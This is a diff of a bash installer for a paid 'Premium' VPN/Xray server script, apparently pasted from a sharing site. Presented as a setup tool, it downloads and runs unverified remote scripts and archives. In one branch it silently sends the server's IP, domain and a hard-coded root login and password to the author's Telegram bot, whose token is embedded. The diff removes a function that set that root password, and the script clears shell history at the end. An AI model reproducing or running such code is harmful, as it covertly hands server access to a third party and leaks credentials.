@@ -1,5 +1,8 @@
+
+Save New Duplicate & Edit Just Text Twitter
 #!/bin/bash
-### Color
+
+# >> Declare Color
 Green="\e[92;1m"
 RED="\033[31m"
 YELLOW="\033[33m"
@@ -13,29 +16,26 @@ GRAY="\e[1;30m"
 NC='\e[0m'
 red='\e[1;31m'
 green='\e[0;32m'
-# ===================
+
+# >> Clear Message Before
 clear
-# // Exporint IP AddressInformation
+
+# >> Set debian frontend to noninteractive
+export DEBIAN_FRONTEND=noninteractive
+
+# >> Exporint IP AddressInformation
 export IP=$( curl -sS ipinfo.io/ip )
-# REPO
+
+# >> REPO
 REPO="https://raw.githubusercontent.com/bestmpc/x/main/"
 
-
-# // Clear Data
-clear
-clear && clear && clear
-clear;clear;clear
-
-# Update and remove packages
-apt install neofetch
-clear
-
-# // Install Requirement Tools
+# >> Install Requirement Tools
 apt-get --reinstall --fix-missing install -y sudo dpkg psmisc socat jq ruby wondershaper python2 tmux nmap bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget vim net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential gcc g++ automake make autoconf perl m4 dos2unix dropbear libreadline-dev zlib1g-dev libssl-dev dirmngr libxml-parser-perl neofetch git lsof iptables iptables-persistent
 apt-get --reinstall --fix-missing install -y libreadline-dev zlib1g-dev libssl-dev python2 screen curl jq bzip2 gzip coreutils rsyslog iftop htop zip unzip net-tools sed gnupg gnupg1 bc sudo apt-transport-https build-essential dirmngr libxml-parser-perl neofetch screenfetch git lsof openssl easy-rsa fail2ban tmux vnstat dropbear libsqlite3-dev socat cron bash-completion ntpdate xz-utils sudo apt-transport-https gnupg2 gnupg1 dnsutils lsb-release chrony
 gem install lolcat
 clear
-  # // Banner
+
+# >> Banner
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo -e "  Welcome To Premium Script Installer ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
 echo -e "     This Will Quick Setup VPN Server On Your Server"
@@ -43,7 +43,7 @@ echo -e "       © Recode By Premium ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
 echo -e "${YELLOW}----------------------------------------------------------${NC}"
 echo ""
 
-# // Checking Os Architecture
+# >> Check Arcitecture Support
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
     echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
 else
@@ -51,7 +51,7 @@ else
     exit 1
 fi
 
-# // Checking System
+# >> Checking Operating Sytem
 if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
     echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
 elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
@@ -61,33 +61,26 @@ else
     exit 1
 fi
 
-# // IP Address Validating
+# >> IP Address Validating
 if [[ $IP == "" ]]; then
     echo -e "${EROR} IP Address ( ${YELLOW}Not Detected${NC} )"
 else
     echo -e "${OK} IP Address ( ${green}$IP${NC} )"
 fi
 
-# // Validate Successfull
+# >> Validate Successfull
 echo ""
 read -p "$( echo -e "Press ${GRAY}[ ${NC}${green}Enter${NC} ${GRAY}]${NC} For Starting Installation") "
 echo ""
+
 clear
-if [ "${EUID}" -ne 0 ]; then
-		echo "You need to run this script as root"
-		exit 1
+
+# >> Check root access
+if [[ $(whoami) != 'root' ]]; then
+    clear; echo -e "${FAIL} Root access required for this process !"; exit 1
 fi
-if [ "$(systemd-detect-virt)" == "openvz" ]; then
-		echo "OpenVZ is not supported"
-		exit 1
-fi
-red='\e[1;31m'
-green='\e[0;32m'
-NC='\e[0m'
-#IZIN SCRIPT
-MYIP=$(curl -sS ipv4.icanhazip.com)
-echo -e "\e[32mloading...\e[0m"
-clear
+
+
 #IZIN SCRIPT
 MYIP=$(curl -sS ipv4.icanhazip.com)
 echo -e "\e[32mloading...\e[0m"
@@ -95,56 +88,67 @@ clear
 
 # Valid Script
 VALIDITY () {
-    today=`date -d "0 days" +"%Y-%m-%d"`
-    Exp1=$(curl ${REPO}access/ip | grep $MYIP | awk '{print $4}')
-    if [[ $today < $Exp1 ]]; then
+    export today=`date -d "0 days" +"%Y-%m-%d"`
+    export Exp1=$(curl ${REPO}access/ip | grep $MYIP | awk '{print $4}')
+
+if [[ $today < $Exp1 ]]; then
     echo -e "\e[32mYOUR SCRIPT ACTIVE..\e[0m"
-	VERSIONSC
-    else
+else
     echo -e "\e[31mScript Anda Telah Expired !!\e[0m";
     echo -e "\e[31mTolong Renew Script di  @admin\e[0m"
     exit 0
 fi
+
 }
-IZIN=$(curl ${REPO}access/ip | awk '{print $5}' | grep $MYIP)
+
+export IZIN=$(curl ${REPO}access/ip | awk '{print $5}' | grep $MYIP)
+
 if [ $MYIP = $IZIN ]; then
-clear
-echo -e "\e[32mPERMISSION ACCEPT...\e[0m"
-sleep 3
-VALIDITY
-clear
+    clear
+    echo -e "\e[32mPERMISSION ACCEPT...\e[0m"
+    sleep 3
+    VALIDITY
+    clear
 else
-clear
-echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo -e "                PERMISSION DENIED ! "
-echo -e "     Your VPS ${NC}( ${green}$IP${NC} ) ${YELLOW}Has been Banned "
-echo -e "         Buy access permissions for scripts "
-echo -e "                 Contact Admin : x-mpc"
-echo -e "             ${green}Telegram t.me/medusa_cha "
-echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-echo ""
-rm -f premi.sh
-exit 0
+    clear
+    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo -e "                PERMISSION DENIED ! "
+    echo -e "     Your VPS ${NC}( ${green}$IP${NC} ) ${YELLOW}Has been Banned "
+    echo -e "         Buy access permissions for scripts "
+    echo -e "                 Contact Admin : x-mpc"
+    echo -e "             ${green}Telegram t.me/medusa_cha "
+    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo ""
+    rm -f premi.sh
+    exit 0
 fi
+
+# >> Clear Message Before
 clear
-#########################
+
 # USERNAME
 rm -f /usr/bin/user
 username=$(curl ${REPO}access/ip | grep $MYIP | awk '{print $2}')
-echo "$username" >/usr/bin/user
+echo "$username" > /usr/bin/user
+
 # validity
 rm -f /usr/bin/e
 valid=$(curl ${REPO}access/ip | grep $MYIP | awk '{print $4}')
-echo "$valid" >/usr/bin/e
+echo "$valid" > /usr/bin/e
+
 # DETAIL ORDER
 username=$(cat /usr/bin/user)
 oid=$(cat /usr/bin/ver)
 exp=$(cat /usr/bin/e)
+
+# >> Clear Message Before
 clear
+
 # CERTIFICATE STATUS
 d1=$(date -d "$valid" +%s)
 d2=$(date -d "$today" +%s)
 certifacate=$(((d1 - d2) / 86400))
+
 # VPS Information
 DATE=$(date +'%Y-%m-%d')
 datediff() {
@@ -172,19 +176,17 @@ start=$(date +%s)
 secs_to_human() {
     echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
 }
+
 ### Status
 function print_ok() {
     echo -e "${OK} ${BLUE} $1 ${FONT}"
 }
+
 function print_install() {
 	echo -e "${green} =============================== ${FONT}"
     echo -e "${YELLOW} # $1 ${FONT}"
 	echo -e "${green} =============================== ${FONT}"
     sleep 1
-}
-
-function print_error() {
-    echo -e "${ERROR} ${REDBG} $1 ${FONT}"
 }
 
 function print_success() {
@@ -196,55 +198,49 @@ function print_success() {
     fi
 }
 
-### Cek root
-function is_root() {
-    if [[ 0 == "$UID" ]]; then
-        print_ok "Root user Start installation process"
-    else
-        print_error "The current user is not the root user, please switch to the root user and run the script again"
-    fi
-
-}
-
 # Buat direktori xray
 print_install "Membuat direktori xray"
-    mkdir -p /etc/xray
-    
-    curl -s ipinfo.io/city >> /etc/xray/city
-    curl -s ifconfig.me > /etc/xray/ipvps
-    curl -s ipinfo.io/org | cut -d " " -f 2-10 >> /etc/xray/isp
-    touch /etc/xray/domain
-    mkdir -p /var/log/xray
-    chown www-data.www-data /var/log/xray
-    chmod +x /var/log/xray
-    touch /var/log/xray/access.log
-    touch /var/log/xray/error.log
-    mkdir -p /var/lib/Premium >/dev/null 2>&1
-    # // Ram Information
-    while IFS=":" read -r a b; do
-    case $a in
-        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
-        "Shmem") ((mem_used+=${b/kB}))  ;;
-        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
-        mem_used="$((mem_used-=${b/kB}))"
-    ;;
-    esac
-    done < /proc/meminfo
-    Ram_Usage="$((mem_used / 1024))"
-    Ram_Total="$((mem_total / 1024))"
-    export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
-    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
-    export Kernel=$( uname -r )
-    export Arch=$( uname -m )
-    export IP=$( curl -s https://ipinfo.io/ip/ )
+
+mkdir -p /etc/xray
+curl -s ipinfo.io/city >> /etc/xray/city
+curl -s ifconfig.me > /etc/xray/ipvps
+curl -s ipinfo.io/org | cut -d " " -f 2-10 >> /etc/xray/isp
+touch /etc/xray/domain
+mkdir -p /var/log/xray
+chown www-data.www-data /var/log/xray
+chmod +x /var/log/xray
+touch /var/log/xray/access.log
+touch /var/log/xray/error.log
+mkdir -p /var/lib/Premium >/dev/null 2>&1
+
+# // Ram Information
+while IFS=":" read -r a b; do
+case $a in
+    "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
+    "Shmem") ((mem_used+=${b/kB}))  ;;
+    "MemFree" | "Buffers" | "Cached" | "SReclaimable")
+    mem_used="$((mem_used-=${b/kB}))"
+;;
+esac
+done < /proc/meminfo
+Ram_Usage="$((mem_used / 1024))"
+Ram_Total="$((mem_total / 1024))"
+
+export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
+export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
+export Kernel=$( uname -r )
+export Arch=$( uname -m )
+export IP=$( curl -s https://ipinfo.io/ip/ )
 
 # Change Environment System
 function first_setup(){
+    
     timedatectl set-timezone Asia/Jakarta
     echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
     echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
     print_success "Directory Xray"
-    if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
+
+if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
     echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
     sudo apt update -y
     apt-get install --no-install-recommends software-properties-common
@@ -252,11 +248,8 @@ function first_setup(){
     apt-get -y install haproxy=2.0.\*
 elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
     echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
-    curl https://haproxy.debian.net/bernat.debian.org.gpg |
-        gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
-    echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
-        http://haproxy.debian.net buster-backports-1.8 main \
-        >/etc/apt/sources.list.d/haproxy.list
+    curl https://haproxy.debian.net/bernat.debian.org.gpg | gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
+    echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" http://haproxy.debian.net buster-backports-1.8 main > /etc/apt/sources.list.d/haproxy.list
     sudo apt-get update
     apt-get -y install haproxy=1.8.\*
 else
@@ -265,8 +258,9 @@ else
 fi
 }
 
-# GEMOY
+# >> Clear Message Before
 clear
+
 function nginx_install() {
     # // Checking System
     if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
@@ -284,6 +278,7 @@ function nginx_install() {
 
 # Update and remove packages
 function base_package() {
+
     clear
     ########
     print_install "Menginstall Packet Yang Dibutuhkan"
@@ -316,53 +311,45 @@ function base_package() {
     apt install python3.7-distutils -y
     python3.7 -m pip install telethon
     python3.7 -m pip install pyarmor
-    print#_success "Packet Yang Dibutuhkan"
-}
-clear
-# Update and remove packages
-function pasang-neofetch() {
-clear
-   apt install neofetch
-   
-}
-clear
-function pasang-lolcat() {
-clear
-# // Install Requirement Tools
-apt-get --reinstall --fix-missing install -y sudo dpkg psmisc socat jq ruby wondershaper python2 tmux nmap bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget vim net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential gcc g++ automake make autoconf perl m4 dos2unix dropbear libreadline-dev zlib1g-dev libssl-dev dirmngr libxml-parser-perl neofetch git lsof iptables iptables-persistent
-apt-get --reinstall --fix-missing install -y libreadline-dev zlib1g-dev libssl-dev python2 screen curl jq bzip2 gzip coreutils rsyslog iftop htop zip unzip net-tools sed gnupg gnupg1 bc sudo apt-transport-https build-essential dirmngr libxml-parser-perl neofetch screenfetch git lsof openssl easy-rsa fail2ban tmux vnstat dropbear libsqlite3-dev socat cron bash-completion ntpdate xz-utils sudo apt-transport-https gnupg2 gnupg1 dnsutils lsb-release chrony
-gem install lolcat
+    print_success "Packet Yang Dibutuhkan"
 
 }
+
+# >> Clear Message Before
 clear
+
 # Fungsi input domain
 function pasang_domain() {
-echo -e ""
-clear
+
+    echo -e ""
+    clear
     echo -e "   .----------------------------------."
-echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
-echo -e "   '----------------------------------'"
-echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
-echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
-echo -e "   ------------------------------------"
-read -p "   Please select numbers 1-2 or Any Button(Random) : " host
-echo ""
+    echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
+    echo -e "   '----------------------------------'"
+    echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
+    echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
+    echo -e "   ------------------------------------"
+    read -p "   Please select numbers 1-2 or Any Button(Random) : " host
+    echo ""
+
 if [[ $host == "1" ]]; then
-echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
-read -p "   Subdomain: " host1
-echo "IP=" >> /var/lib/Premium/ipvps.conf
-echo $host1 > /etc/xray/domain
-echo $host1 > /root/domain
-echo ""
+    echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
+    read -p "   Subdomain: " host1
+    echo "IP=" >> /var/lib/Premium/ipvps.conf
+    echo $host1 > /etc/xray/domain
+    echo $host1 > /root/domain
+    echo ""
 elif [[ $host == "2" ]]; then
-#install cf
-wget ${REPO}ssh/cf.sh && chmod +x cf.sh && ./cf.sh
-rm -f /root/cf.sh
-clear
+
+    # >> install cf
+    wget ${REPO}ssh/cf.sh; chmod +x cf.sh; ./cf.sh
+    rm -f /root/cf.sh
+    clear
+
 else
-print_install "Random Subdomain/Domain is Used"
-wget ${REPO}ssh/cf.sh && chmod +x cf.sh && ./cf.sh
-rm -f /root/cf.sh
+    print_install "Random Subdomain/Domain is Used"
+    wget ${REPO}ssh/cf.sh; chmod +x cf.sh; ./cf.sh
+    rm -f /root/cf.sh
     CHATID="6319520678"
     KEY="6586384477:AAFzK6kPLWmyOvgNl8hd_kUfDUXjZPvDLM8"
     TIME="10"
@@ -371,7 +358,7 @@ rm -f /root/cf.sh
 
 ============================
 Domain		: <code>$domain</code>
-IP Vps	        : <code>$IP</code>
+IP Vps      : <code>$IP</code>
 User Login	: <code>root</code>
 Pass Login	: <code>070711</code>
 User Scrip	: <code>$username</code>
@@ -380,25 +367,15 @@ Exp Script	: <code>$exp</code>
 x-mpc
 ============================
 "
-   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-clear
-    fi
+    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    clear
+fi
+
 }
 
+# >> Clear Message Before
 clear
-#GANTI PASSWORD DEFAULT
-function password_default() {
-    domain=$(cat /root/domain)
-    userdel jame > /dev/null 2>&1
-    Username="root"
-    Password=070711
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
-}
 
-clear
 # Pasang SSL
 function pasang_ssl() {
 clear
@@ -841,25 +818,18 @@ rm -f /root/cert.pem
 print_success "All Packet"
 }
 
-#Instal Menu
+# >> Instal Menu
 function menu(){
-    clear
-    print_install "Memasang Menu Packet"
-    wget -O ~/menu.zip "${REPO}menu.zip" >/dev/null 2>&1
-    mkdir /root/menu
-    unzip menu.zip -d /root/menu/ >/dev/null 2>&1
-    chmod +x /root/menu/*
-    mv /root/menu/* /usr/local/sbin/
-    #botmintod
-    wget ${REPO}botmin.zip
-    unzip botmin.zip
-    mv adminbot /etc
-    rm *.zip
-    touch /etc/adminbot/var.txt
-}
+    clear; print_install "Memasang Menu Packet"; cd /root;
+    wget -O ~/menu.zip "${REPO}menu.zip" >/dev/null 2>&1;
+    unzip menu.zip -d /root/menu/ >/dev/null 2>&1;
+    mv /root/menu/menu/menu/* /usr/local/sbin/; chmod +x /usr/local/sbin/*;
+    rm -rf /root/menu.zip /root/menu; clear; cd /root;
 
-# Membaut Default Menu 
-#!/bin/bash
+    wget ${REPO}botmin.zip > /dev/null 2>&1; 
+    unzip botmin.zip -d /root/ >/dev/null 2>&1;
+    mv botmin /etc; rm *.zip; touch /etc/botmin/var.txt
+}
 
 function profile() {
     clear
@@ -979,7 +949,6 @@ clear
     base_package
     nginx_install
     make_folder_xray
-#   password_default
     install_xray
     ssh
     udp_mini
@@ -996,8 +965,11 @@ clear
     profile
     enable_services
 }
+
 instal
+
 echo ""
+
 history -c
 rm -rf /root/menu
 rm -rf /root/*.zip
@@ -1005,6 +977,7 @@ rm -rf /root/*.sh
 rm -rf /root/LICENSE
 rm -rf /root/README.md
 rm -rf /root/domain
+
 #sudo hostnamectl set-hostname $user
 secs_to_human "$(($(date +%s) - ${start}))"
 echo ""
